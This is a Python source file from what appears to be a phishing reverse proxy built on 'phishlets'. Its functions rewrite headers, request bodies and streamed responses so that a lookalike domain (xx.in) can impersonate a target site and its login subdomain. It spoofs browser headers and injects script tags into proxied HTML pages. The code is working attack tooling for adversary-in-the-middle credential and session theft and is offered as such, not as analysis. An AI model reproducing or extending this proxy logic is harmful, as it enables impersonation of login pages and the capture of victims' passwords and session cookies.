


def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
    
    # print(f"commin headers: {headers}")
    # Convert CIMultiDictProxy to regular dict if needed
    if hasattr(headers, 'getall'):
        # It's a CIMultiDictProxy, convert to regular dict
        headers_dict = dict(headers)
    else:
        # It's already a regular dict
        headers_dict = headers.copy()
    

    #  chnage value of User-Agent
    if "User-Agent" in headers_dict:
        headers_dict['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        headers_dict['Sec-Ch-Ua-Platform'] = "Windows"
    # Check and modify Accept-Encoding header to remove zstd if present
    if 'Accept-Encoding' in headers_dict:
        accept_encoding = headers_dict['Accept-Encoding']
        print(f"\n  🟢 🟢---- Original Accept-Encoding: {accept_encoding}")
        
        # Check if zstd is present in the Accept-Encoding header
        if 'zstd' in accept_encoding.lower():
            # Remove zstd from the Accept-Encoding header
            # Split by comma, filter out zstd, and rejoin
            encodings = [enc.strip() for enc in accept_encoding.split(',')]
            filtered_encodings = [enc for enc in encodings if 'zstd' not in enc.lower()]
            
            if filtered_encodings:
                headers_dict['Accept-Encoding'] = ', '.join(filtered_encodings)
                print(f"  🔧 Removed zstd from Accept-Encoding: {headers_dict['Accept-Encoding']}")
            else:
                # If no encodings left after removing zstd, set to identity
                headers_dict['Accept-Encoding'] = 'identity'
                print(f"  🔧 No encodings left after removing zstd, set to identity")
        else:
            print(f"  ✅ zstd not found in Accept-Encoding, keeping as is")
    
    # Remove any Accept-Encoding to force identity (no compression) from upstream
    # This avoids sending compressed payloads (e.g., br) that we might not decompress.
    # keys_to_delete = [k for k in list(headers_dict.keys()) if k.lower() == 'accept-encoding']
    # for k in keys_to_delete:
    #     headers_dict.pop(k, None)
    # check if accept-encoding is in headers_dict if yes then print the headers_dict
    if 'Accept-Encoding' in headers_dict:
        print(f"\n  🟢 🟢---- headers_dict: {headers_dict}")
    # headers_dict['Accept-Encoding'] = 'identity'

    # If we have phishlet data and reverse filter is enabled, use proper hostname replacement
    if phishlet_data and any(host.get('reverce_filter', False) for host in phishlet_data.get('hosts_to_proxy', [])):
        # Build replacement mapping: proxy_hostname -> original_hostname
        hosts_to_proxy = phishlet_data.get('hosts_to_proxy', [])
        print(f"\n ---- hosts_to_proxy: {hosts_to_proxy}")
        print(f"\n ---- proxy_host parameter: {proxy_host}")
        
        # Extract base domain from proxy_host (e.g., 'test.xx.in' -> 'xx.in')
        base_domain = proxy_host
        if '.' in proxy_host:
            # Split by dots and take the last two parts for the base domain
            parts = proxy_host.split('.')
            if len(parts) >= 2:
                base_domain = '.'.join(parts[-2:])
        
        print(f"\n ---- extracted base_domain: {base_domain}")
        
        replacement_map = {}
        
        for host_entry in hosts_to_proxy:
            if not host_entry.get('reverce_filter', False):
                continue
                
            original_host = host_entry.get('host', '').strip()
            proxy_subdomain = host_entry.get('proxy_subdomain', '').strip()
            original_subdomain = host_entry.get('orignal_subdomain', '').strip()
            
            if not original_host:
                continue
            
            # Build the proxy hostname that should be replaced
            if proxy_subdomain:
                proxy_hostname = f"{proxy_subdomain}.{base_domain}"
            else:
                proxy_hostname = base_domain
            
            # Build the original hostname to replace with
            # Use the host field directly - it already contains the full hostname
            original_hostname = original_host
            
            replacement_map[proxy_hostname] = original_hostname
            
        print(f"\n ---- replacement_map: {replacement_map}")
        
        # Sort by length (longest first) to ensure specific subdomains are processed before base domains
        sorted_replacements = sorted(replacement_map.items(), key=lambda x: len(x[0]), reverse=True)
        print(f"Sorted replacements: {sorted_replacements}")
        
        # Apply replacements to headers
        for key, value in headers_dict.items():
            if isinstance(value, str):
                modified_value = value
                
                # Use a single-pass replacement with a unique marker approach
                # This prevents any possibility of double replacements
                import re
                
                # Create a mapping with unique markers
                marker_map = {}
                marked_value = value
                
                # Step 1: Replace each proxy hostname with a unique marker
                for i, (proxy_hostname, original_hostname) in enumerate(sorted_replacements):
                    marker = f"__REVERSE_FILTER_MARKER_{i}__"
                    marker_map[marker] = original_hostname
                    
                    # Escape special regex characters
                    escaped_proxy = re.escape(proxy_hostname)
                    # Use a pattern that matches the exact hostname with proper boundaries
                    pattern = rf'(?<![A-Za-z0-9.-]){escaped_proxy}(?![A-Za-z0-9.-])'
                    marked_value = re.sub(pattern, marker, marked_value)
                
                # Step 2: Replace all markers with their original hostnames
                for marker, original_hostname in marker_map.items():
                    marked_value = marked_value.replace(marker, original_hostname)
                
                headers_dict[key] = marked_value
            elif isinstance(value, (list, tuple)):
                # Handle multi-value headers
                new_values = []
                for v in value:
                    if isinstance(v, str):
                        modified_v = v
                        
                        # Use a single-pass replacement with a unique marker approach
                        # This prevents any possibility of double replacements
                        import re
                        
                        # Create a mapping with unique markers
                        marker_map = {}
                        marked_v = v
                        
                        # Step 1: Replace each proxy hostname with a unique marker
                        for i, (proxy_hostname, original_hostname) in enumerate(sorted_replacements):
                            marker = f"__REVERSE_FILTER_MARKER_{i}__"
                            marker_map[marker] = original_hostname
                            
                            # Escape special regex characters
                            escaped_proxy = re.escape(proxy_hostname)
                            # Use a pattern that matches the exact hostname with proper boundaries
                            pattern = rf'(?<![A-Za-z0-9.-]){escaped_proxy}(?![A-Za-z0-9.-])'
                            marked_v = re.sub(pattern, marker, marked_v)
                        
                        # Step 2: Replace all markers with their original hostnames
                        for marker, original_hostname in marker_map.items():
                            marked_v = marked_v.replace(marker, original_hostname)
                        
                        new_values.append(marked_v)
                    else:
                        new_values.append(v)
                headers_dict[key] = new_values
    else:
        # Fallback to simple replacement for backward compatibility
        # Check all headers, find proxy host in header values and replace with target host
        for key, value in headers_dict.items():
            if isinstance(value, str) and proxy_host in value:
                headers_dict[key] = value.replace(proxy_host, target_host)
            elif isinstance(value, (list, tuple)):
                # Handle multi-value headers
                new_values = []
                for v in value:
                    if isinstance(v, str) and proxy_host in v:
                        new_values.append(v.replace(proxy_host, target_host))
                    else:
                        new_values.append(v)
                headers_dict[key] = new_values
    
    print(f"phishlet_data_for_headers: {phishlet_data} \n")
    
    # Check if phishlet_data exists before accessing its properties
    if phishlet_data:
        # one more time go through all headers and replace proxy host domain with target host domain
        proxy_domain = phishlet_data.get('proxy_domain', '')
        target_url = phishlet_data.get('target_url', '')
        
        if target_url and '//' in target_url:
            try:
                target_domain = target_url.split('//')[1].split('/')[0]
                print(f"proxy_host: {proxy_domain}, target_host: {target_domain}")
            except (IndexError, AttributeError):
                print(f"Warning: Could not parse target_url: {target_url}")
                target_domain = ''
        else:
            print(f"Warning: Invalid target_url format: {target_url}")
            target_domain = ''
    else:
        print("No phishlet data available for header processing")
        proxy_domain = ''
        target_domain = ''
    # for key, value in headers_dict.items():
    #     if isinstance(value, str) and proxy_domain in value:
    #         headers_dict[key] = value.replace(proxy_domain, target_domain)
    #     elif isinstance(value, (list, tuple)):
    #         new_values = []
    #         for v in value:
    #             if isinstance(v, str) and proxy_host in v:
    #                 new_values.append(v.replace(proxy_host, target_host))
    #             else:
    #                 new_values.append(v)
    #         headers_dict[key] = new_values
    return headers_dict

def patch_headers_in(headers, proxy_host, target_host):
    # Convert CIMultiDictProxy to regular dict if needed
    if hasattr(headers, 'getall'):
        # It's a CIMultiDictProxy, convert to regular dict
        headers_dict = dict(headers)
    else:
        # It's already a regular dict
        headers_dict = headers.copy()
    
    # Check all headers, find target host in header values and replace with proxy host
    for key, value in headers_dict.items():
        if isinstance(value, str) and target_host in value:
            headers_dict[key] = value.replace(target_host, proxy_host)
        elif isinstance(value, (list, tuple)):
            # Handle multi-value headers
            new_values = []
            for v in value:
                if isinstance(v, str) and target_host in v:
                    new_values.append(v.replace(target_host, proxy_host))
                else:
                    new_values.append(v)
            headers_dict[key] = new_values
    return headers_dict


def replace_in_response(response, target_host, proxy_host):
    # For StreamResponse objects, content replacement should be done during streaming
    # The headers have already been patched in the main handler
    # No need to manipulate response.text as StreamResponse doesn't have this attribute
    return response

def replace_in_chunk(chunk, target_host, proxy_host):
    """
    Replace target_host with proxy_host in a chunk of data.
    Handles both text and binary data.
    """
    if isinstance(chunk, bytes):
        # Only try UTF-8 for consistency
        try:
            chunk_str = chunk.decode('utf-8')
            if target_host in chunk_str:
                print(f"Replacing {target_host} with {proxy_host} in chunk")
                replaced_str = chunk_str.replace(target_host, proxy_host)
                return replaced_str.encode('utf-8')
            return chunk
        except UnicodeDecodeError:
            # If it's binary data, return as-is without modification
            return chunk
    elif isinstance(chunk, str):
        if target_host in chunk:
            print(f"Replacing {target_host} with {proxy_host} in string chunk")
            return chunk.replace(target_host, proxy_host)
        return chunk

import re


def replace_in_chunk_multi(chunk, target_to_proxy_map):
    """
    Replace multiple target hosts with their proxy hosts in a chunk.
    target_to_proxy_map: Dict[str, str] mapping target_host -> proxy_host
    """
    if not isinstance(target_to_proxy_map, dict) or not target_to_proxy_map:
        return chunk
    
    if isinstance(chunk, bytes):
        try:
            chunk_str = chunk.decode('utf-8')
            replaced = False
            for target, proxy in target_to_proxy_map.items():
                if target in chunk_str:
                    chunk_str = chunk_str.replace(target, proxy)
                    replaced = True
            if replaced:
                return chunk_str.encode('utf-8')
            return chunk
        except UnicodeDecodeError:
            return chunk
    elif isinstance(chunk, str):
        replaced = False
        for target, proxy in target_to_proxy_map.items():
            if target in chunk:
                chunk = chunk.replace(target, proxy)
                replaced = True
        return chunk
    return chunk


def apply_reverse_filter_to_request_body(request_body, phishlet_data, proxy_domain):
    """
    Apply reverse filter to request body when reverce_filter is enabled.
    This replaces proxy hostnames with original hostnames in the request body.
    
    Args:
        request_body: The request body (bytes or str)
        phishlet_data: The phishlet configuration data
        proxy_domain: The proxy domain (e.g., 'xx.in')
    
    Returns:
        Modified request body with hostname replacements
    """
    if not request_body:
        return request_body
    
    # Check if phishlet_data exists before accessing its properties
    if not phishlet_data:
        return request_body
    
    # Check if reverse filter is enabled for any hosts
    hosts_to_proxy = phishlet_data.get('hosts_to_proxy', [])
    reverse_filter_enabled = any(host.get('reverce_filter', False) for host in hosts_to_proxy)
    
    if not reverse_filter_enabled:
        return request_body
    
    # Build replacement mapping: proxy_hostname -> original_hostname
    # Sort by length (longest first) to ensure specific subdomains are processed before base domains
    replacement_map = {}
    
    for host_entry in hosts_to_proxy:
        if not host_entry.get('reverce_filter', False):
            continue
            
        original_host = host_entry.get('host', '').strip()
        proxy_subdomain = host_entry.get('proxy_subdomain', '').strip()
        original_subdomain = host_entry.get('orignal_subdomain', '').strip()
        
        if not original_host:
            continue
        
        # Build the proxy hostname that should be replaced
        if proxy_subdomain:
            proxy_hostname = f"{proxy_subdomain}.{proxy_domain}"
        else:
            proxy_hostname = proxy_domain
        
        # Build the original hostname to replace with
        # Use the host field directly - it already contains the full hostname
        original_hostname = original_host
        
        replacement_map[proxy_hostname] = original_hostname
    
    # Sort by length (longest first) to ensure specific subdomains are processed before base domains
    sorted_replacements = sorted(replacement_map.items(), key=lambda x: len(x[0]), reverse=True)
    
    if not sorted_replacements:
        return request_body
    
    # Apply replacements using a completely different approach to prevent double replacements
    if isinstance(request_body, bytes):
        try:
            body_str = request_body.decode('utf-8')
            modified_body = body_str
            
            # Use a single-pass replacement with a unique marker approach
            # This prevents any possibility of double replacements
            import re
            
            # Create a mapping with unique markers
            marker_map = {}
            marked_body = body_str
            
            # Step 1: Replace each proxy hostname with a unique marker
            for i, (proxy_hostname, original_hostname) in enumerate(sorted_replacements):
                marker = f"__REVERSE_FILTER_MARKER_{i}__"
                marker_map[marker] = original_hostname
                
                # Escape special regex characters
                escaped_proxy = re.escape(proxy_hostname)
                # Use a pattern that matches the exact hostname with proper boundaries
                pattern = rf'(?<![A-Za-z0-9.-]){escaped_proxy}(?![A-Za-z0-9.-])'
                marked_body = re.sub(pattern, marker, marked_body)
            
            # Step 2: Replace all markers with their original hostnames
            for marker, original_hostname in marker_map.items():
                marked_body = marked_body.replace(marker, original_hostname)
            
            return marked_body.encode('utf-8')
        except UnicodeDecodeError:
            # If it's binary data, return as-is without modification
            return request_body
    elif isinstance(request_body, str):
        modified_body = request_body
        
        # Use a single-pass replacement with a unique marker approach
        # This prevents any possibility of double replacements
        import re
        
        # Create a mapping with unique markers
        marker_map = {}
        marked_body = request_body
        
        # Step 1: Replace each proxy hostname with a unique marker
        for i, (proxy_hostname, original_hostname) in enumerate(sorted_replacements):
            marker = f"__REVERSE_FILTER_MARKER_{i}__"
            marker_map[marker] = original_hostname
            
            # Escape special regex characters
            escaped_proxy = re.escape(proxy_hostname)
            # Use a pattern that matches the exact hostname with proper boundaries
            pattern = rf'(?<![A-Za-z0-9.-]){escaped_proxy}(?![A-Za-z0-9.-])'
            marked_body = re.sub(pattern, marker, marked_body)
        
        # Step 2: Replace all markers with their original hostnames
        for marker, original_hostname in marker_map.items():
            marked_body = marked_body.replace(marker, original_hostname)
        
        return marked_body
    
    return request_body


def process_phishlet_filters(phishlet_data, request_path, response_status=None, debug_log=None):
    """
    Process phishlet filters and return a mapping of locate -> replace pairs.
    
    Args:
        phishlet_data: The phishlet configuration data containing filters
        request_path: The current request path for URL-specific filters
        response_status: The HTTP response status code (used for 302 redirects)
        debug_log: Optional debug logging function
    
    Returns:
        dict: Mapping of locate strings to replace strings
    """
    if not phishlet_data:
        return {}
    
    filters = phishlet_data.get('filters', [])
    if not filters:
        return {}
    
    filter_replacements = {}
    
    for filter_item in filters:
        if filter_item.get('type') == 'url':
            if filter_item.get('url') == '*':
                # Global filter - applies to all URLs
                locate = filter_item.get('locate')
                replace = filter_item.get('replace')
                if locate and replace:
                    filter_replacements[locate] = replace
                    if debug_log:
                        debug_log(f"  String replacement mapping (global): {locate} -> {replace}", "DEBUG")
            else:
                # URL-specific filter - check if it matches current request path
                filter_url = filter_item.get('url', '')
                if filter_url == request_path or filter_url in request_path:
                    locate = filter_item.get('locate')
                    replace = filter_item.get('replace')
                    if locate and replace:
                        filter_replacements[locate] = replace
                        if debug_log:
                            debug_log(f"  String replacement mapping (URL-specific): {locate} -> {replace} for path {request_path}", "DEBUG")
                else:
                    if debug_log:
                        debug_log(f"  Skipping string replacement for path {request_path} (filter URL: {filter_url})", "DEBUG")
        else:
            if debug_log:
                debug_log(f"  Skipping non-URL filter: {filter_item.get('type')}", "DEBUG")
    
    # if response status is 302 then in header Location value apply replacements
    if (response_status == 302 or response_status == 301 ) and 'Location' in filter_replacements:
        # Apply all other replacements to the Location header value
        location_value = filter_replacements['Location']
        for locate, replace in filter_replacements.items():
            if locate != 'Location' and locate in location_value:
                location_value = location_value.replace(locate, replace)
                if debug_log:
                    debug_log(f"Applied replacement to Location header: '{locate}' -> '{replace}'", "DEBUG")
        filter_replacements['Location'] = location_value
        if debug_log:
            debug_log(f"Final Location header value after replacements: {location_value}", "DEBUG")
    
    return filter_replacements


def patch_response_header_2(patched_headers, ordered_replacements, debug_log=None):
    """
    Apply additional header replacements based on ordered_replacements.
    Uses a marker-based approach to prevent double replacements.
    
    Args:
        patched_headers: Dictionary of headers to be modified
        ordered_replacements: List of tuples (target, proxy) for replacements
        debug_log: Optional debug logging function
    
    Returns:
        dict: Modified headers with replacements applied
    """
    if not ordered_replacements:
        return patched_headers
    
    if debug_log:
        debug_log(f"  Applying ordered replacements to patched headers: --------\n --------------------------------")
    
    import re
    
    for key, value in patched_headers.items():
        if not isinstance(value, str):
            continue
            
        # Use a marker-based approach to prevent double replacements
        new_value = value
        marker_map = {}
        
        # Step 1: Replace each target with a unique marker
        for i, (target, proxy) in enumerate(ordered_replacements):
            if target in new_value:
                marker = f"__HEADER_REPLACEMENT_MARKER_{i}__"
                marker_map[marker] = proxy
                new_value = new_value.replace(target, marker)
                if debug_log:
                    debug_log(f"  Replaced in patched header {key}: {target} -> {marker}", "DEBUG")
        
        # Step 2: Replace all markers with their final values
        for marker, proxy in marker_map.items():
            new_value = new_value.replace(marker, proxy)
        
        # Update the patched header if any replacements were made
        if new_value != value:
            patched_headers[key] = new_value
            if debug_log:
                debug_log(f"  Final patched header {key}: {value} -> {new_value}", "DEBUG")
    
    if debug_log:
        debug_log(f"  Applied ordered replacements to patched headers: --------\n --------------------------------")
        debug_log(f"  Final patched headers: --------\n --------------------------------")
        # debug_log(f"  {patched_headers}", "DEBUG")
        debug_log(f"  --------------------------------")
    
    return patched_headers


def create_ordered_replacements(filtered_map, target_host, debug_log=None):
    """
    Create ordered replacements list sorted by target length (longest first).
    
    Args:
        filtered_map: Dictionary of target -> proxy mappings
        target_host: The primary target host for special logging
        debug_log: Optional debug logging function
    
    Returns:
        list: List of tuples (target, proxy) sorted by target length (longest first)
    """
    # Prepare ordered replacements: ALL sorted by descending target length to ensure specific subdomains are replaced before base domains
    ordered_replacements = []  # List[Tuple[str, str]]
    
    # Add ALL mappings (including target_host) to be sorted by length
    all_mappings = [(t, p) for t, p in filtered_map.items()]
    # Sort by length in descending order so longer hostnames (like tools.fluxxset.com) are processed before shorter ones (like fluxxset.com)
    all_mappings.sort(key=lambda kv: len(kv[0]), reverse=True)
    
    for tgt, prox in all_mappings:
        ordered_replacements.append((tgt, prox))
        if debug_log:
            if tgt == target_host:
                debug_log(f"  Primary replacement: {target_host} -> {prox}", "DEBUG")
            else:
                debug_log(f"  Secondary replacement: {tgt} -> {prox}", "DEBUG")
    
    # if debug_log:
    #     # Debug: Verify the replacement order is correct
    #     debug_log(f"Final replacement order (longest first): {[(t, p) for t, p in ordered_replacements]}", "DEBUG")
        
      
        
    return ordered_replacements


def apply_content_replacements(combined, ordered_replacements, should_apply_replacements, content_type, 
                             incoming_host, request, chunk_count, debug_log=None):
    """
    Apply all content replacements including regex-based replacements, hardcoded mappings, 
    and JavaScript injection for HTML content.
    
    Args:
        combined: The content string to apply replacements to
        ordered_replacements: List of tuples (target, proxy) for replacements
        should_apply_replacements: Boolean indicating if replacements should be applied
        content_type: The content type of the response
        incoming_host: The incoming host for hardcoded mappings
        request: The request object for JavaScript injection tracking
        chunk_count: The current chunk number for logging
        debug_log: Optional debug logging function
    
    Returns:
        tuple: (modified_content, request_updated) where request_updated may have new tracking flags
    """
    if not ordered_replacements or not should_apply_replacements:
        if debug_log:
            debug_log(f"⏭️  Skipping replacements for non-text content type: {content_type}", "DEBUG")
        return combined, request
    
    import re
    
    # Step 1: Create a mapping of all replacements to apply
    replacement_map = {}
    for tgt, prox in ordered_replacements:
        if tgt and prox and tgt in combined:
            replacement_map[tgt] = prox
    
    # Step 2: Apply all replacements using regex to avoid interference
    if replacement_map:
        # Sort by length (longest first) to ensure specific subdomains are processed first
        sorted_replacements = sorted(replacement_map.items(), key=lambda x: len(x[0]), reverse=True)
        
        if debug_log:
            debug_log(f"🔄 Applying {len(sorted_replacements)} replacements using regex for chunk {chunk_count}", "DEBUG")
        
        # Create a single regex pattern that matches all targets
        pattern_parts = []
        replacement_dict = {}
        
        for tgt, prox in sorted_replacements:
            # Escape special regex characters and add word boundaries
            escaped_target = re.escape(tgt)
            pattern_parts.append(escaped_target)
            replacement_dict[tgt] = prox
        
        # Create a single regex pattern
        if pattern_parts:
            pattern = '|'.join(pattern_parts)
            regex = re.compile(pattern)
            
            # Apply all replacements in a single operation
            old_combined = combined
            
            def replacement_function(match):
                matched_text = match.group(0)
                if matched_text in replacement_dict:
                    replacement = replacement_dict[matched_text]
                    if debug_log:
                        debug_log(f"✓ Regex replaced '{matched_text}' with '{replacement}' in chunk {chunk_count}", "INFO")
                        # Special tracking for tools.fluxxset.com replacement
                        if 'tools.fluxxset.com' in matched_text:
                            debug_log(f"🎯 SUCCESS: tools.fluxxset.com -> {replacement} replacement completed!", "INFO")
                    return replacement
                return matched_text
            
            combined = regex.sub(replacement_function, combined)
            
            # Debug: show final result
            if old_combined != combined:
                if debug_log:
                    debug_log(f"🔄 Regex replacements completed for chunk {chunk_count}", "DEBUG")
            else:
                if debug_log:
                    debug_log(f"⚠️  No replacements were made in chunk {chunk_count}", "DEBUG")
    
    # STEP 3: Apply hardcoded mappings AFTER all regex replacements are done
    # These are final cleanup replacements that should happen at the very end
    if should_apply_replacements:
        hardcoded_replacements = {}
        
        # Add hardcoded mappings for specific subdomain replacements (if applicable)
        if incoming_host == "xx.in":
            hardcoded_replacements["login.fluxxset.com"] = "login1.xx.in"
            if debug_log:
                debug_log(f"Added hardcoded mapping for final pass: login.fluxxset.com -> login1.xx.in", "DEBUG")
        
        # Apply hardcoded replacements if any exist
        if hardcoded_replacements:
            if debug_log:
                debug_log(f"🔄 Applying {len(hardcoded_replacements)} hardcoded replacements after regex", "DEBUG")
            old_combined = combined
            
            for tgt, prox in hardcoded_replacements.items():
                if tgt in combined:
                    combined = combined.replace(tgt, prox)
                    if debug_log:
                        debug_log(f"✓ Final hardcoded replacement: '{tgt}' -> '{prox}' in chunk {chunk_count}", "INFO")
            
            if old_combined != combined:
                if debug_log:
                    debug_log(f"🔄 Hardcoded replacements completed for chunk {chunk_count}", "DEBUG")
            else:
                if debug_log:
                    debug_log(f"⚠️  No hardcoded replacements were made in chunk {chunk_count}", "DEBUG")
    else:
        if debug_log:
            debug_log(f"⏭️  Skipping hardcoded replacements for non-text content type: {content_type}", "DEBUG")
    
    # STEP 4: JavaScript injection for HTML content
    # Only inject JavaScript for HTML content types and when we have script endpoints
    if (should_apply_replacements and 
        'text/html' in content_type and 
        request.get('js_script_endpoints')):
        
        script_endpoints = request.get('js_script_endpoints', [])
        if script_endpoints:
            if debug_log:
                debug_log(f"🔄 Applying JavaScript injection for {len(script_endpoints)} scripts in chunk {chunk_count}", "DEBUG")
            
            # For streaming HTML, we need to inject script tags strategically
            # Check if this chunk contains closing head tag
            if '</head>' in combined:
                if debug_log:
                    debug_log(f"🎯 Found </head> tag in chunk {chunk_count}, injecting scripts", "INFO")
                
                # Inject script tags before </head>
                script_tags = []
                for endpoint in script_endpoints:
                    script_tags.append(f'<script src="/_temp_js/{endpoint}"></script>')
                
                script_html = '\n    '.join(script_tags)
                combined = combined.replace('</head>', f'    {script_html}\n</head>')
                
                if debug_log:
                    debug_log(f"✓ Injected {len(script_endpoints)} script tags before </head>", "INFO")
                
                # Mark as injected to avoid duplicate injection
                request['js_injection_completed'] = True
            elif '</body>' in combined and not request.get('js_injection_completed'):
                # Fallback: if no </head> tag but we have </body>, inject before it
                if debug_log:
                    debug_log(f"🎯 Found </body> tag in chunk {chunk_count}, injecting scripts (fallback)", "INFO")
                
                script_tags = []
                for endpoint in script_endpoints:
                    script_tags.append(f'<script src="/_temp_js/{endpoint}"></script>')
                
                script_html = '\n    '.join(script_tags)
                combined = combined.replace('</body>', f'    {script_html}\n</body>')
                
                if debug_log:
                    debug_log(f"✓ Injected {len(script_endpoints)} script tags before </body> (fallback)", "INFO")
                request['js_injection_completed'] = True
            elif '</html>' in combined and not request.get('js_injection_completed'):
                # Final fallback: if no </head> or </body> tag but we have </html>, inject before it
                if debug_log:
                    debug_log(f"🎯 Found </html> tag in chunk {chunk_count}, injecting scripts (final fallback)", "INFO")
                
                script_tags = []
                for endpoint in script_endpoints:
                    script_tags.append(f'<script src="/_temp_js/{endpoint}"></script>')
                
                script_html = '\n    '.join(script_tags)
                combined = combined.replace('</html>', f'    {script_html}\n</html>')
                
                if debug_log:
                    debug_log(f"✓ Injected {len(script_endpoints)} script tags before </html> (final fallback)", "INFO")
                request['js_injection_completed'] = True
            else:
                if debug_log:
                    debug_log(f"⏳ No closing tags found in chunk {chunk_count}, scripts will be injected later", "DEBUG")
    else:
        if debug_log:
            debug_log(f"⏭️  Skipping JavaScript injection for non-HTML content type: {content_type}", "DEBUG")
    


    return combined, request